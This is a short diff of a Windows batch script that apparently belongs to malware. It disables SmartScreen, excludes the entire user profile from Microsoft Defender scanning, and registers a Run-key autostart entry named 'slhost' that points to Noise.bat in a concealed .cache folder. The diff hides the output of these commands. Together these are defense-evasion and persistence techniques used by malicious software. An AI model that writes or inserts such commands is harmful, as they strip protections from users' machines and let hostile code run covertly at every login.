@@ -1,9 +1,8 @@
 @echo off
 
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f /v EnableSmartScreen /t REG_DWORD /d 0
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f /v EnableSmartScreen /t REG_DWORD /d 0 >nul 2>&1 
 powershell.exe -c "Set-MpPreference -ExclusionPath $env:USERPROFILE"
-REG DELETE "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost 
-REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  
+REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v slhost /d \"%USERPROFILE%\.cache\services\slhost\Noise.bat\"  >nul 2>&1 
 
 mkdir %USERPROFILE%\.cache\services\slhost\ >nul 2>&1 
 
